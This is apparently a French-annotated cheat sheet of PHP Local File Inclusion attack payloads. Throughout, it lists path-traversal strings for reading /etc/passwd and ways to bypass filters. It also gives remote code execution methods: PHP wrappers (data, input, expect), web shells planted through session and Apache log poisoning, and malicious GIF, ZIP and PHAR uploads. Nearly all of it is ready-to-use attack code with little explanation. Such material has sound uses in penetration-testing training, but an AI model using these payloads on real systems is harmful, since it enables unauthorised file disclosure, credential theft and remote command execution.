# Basic

Basic LFI

```sh
/index.php?language=/etc/passwd
```

LFI with path traversal

```sh
/index.php?language=../../../../etc/passwd
```

LFI with name prefix

```sh
/index.php?language=/../../../etc/passwd
```

LFI with approved path

```sh
/index.php?language=./languages/../../../../etc/passwd

```

---
# Bypass Techniques

Bypass basic path traversal filter

```sh
/index.php?language=....//....//....//....//etc/passwd
```

Bypass filters with URL encoding

```sh
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Bypass appended extension with path truncation (obsolete)

```sh
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Bypass appended extension with null byte (obsolete)

```sh
/index.php?language=../../../../etc/passwd%00
/index.php?language=../../../../etc/passwd%00.php
```

Read PHP with base64 filter

```
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

---
# Code Execution 
### With PHP Wrappers

Verifier la version de PHP `/etc/php/X.Y/apache2/php.ini`

> Si on n'a `allow_url_include = On` Ou `extension=expect`


#data

```sh
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#input 

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

#expectr 

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

### With Session 

Read PHP session parameters

```sh
/index.php?language=/var/lib/php/sessions/sess_[SESSIONS_ID]
```

Poison PHP session with web shell

```sh 
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E  
```

RCE through poisoned PHP session 

```sh
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Log-Poisoning 

L'empoisonnement des journaux est une technique utilisée pour obtenir un shell inversé à partir d'une vulnérabilité LFI. 
Pour le faire fonctionner, un attaquant tente d'injecter une entrée malveillante dans le journal du serveur (user-agent).

Fichier journal apache pour avoir la possibilité d'utiliser l'empoisonnement du journal:

```http
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
```

Pour que cela se produise, le répertoire doit disposer des autorisations de lecture et d'exécution


Poison server log

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

RCE through poisoned PHP session 

```sh
/index.php?language=/var/log/apache2/access.log&cmd=id  
````

```http
http://vulnweb.com/var/log/apache2/access.log&cmd=id
```

----
# LFI + Upload

#GIF

```sh
# Create malicious image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# RCE with malicious uploaded image
/index.php?language=./profile_images/shell.gif&cmd=id
```

#ZIP 

```sh
# Create malicious zip archive 'as jpg'
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# RCE with malicious uploaded zip
/index.php?language=zip://shell.zip%23shell.php&cmd=id

````

#PHAR 

```sh
## content of rshell.php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
?>

# Create malicious phar 'as jpg'
php --define phar.readonly=0 rshell.php && mv shell.phar shell.jpg

# RCE with malicious uploaded phar
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```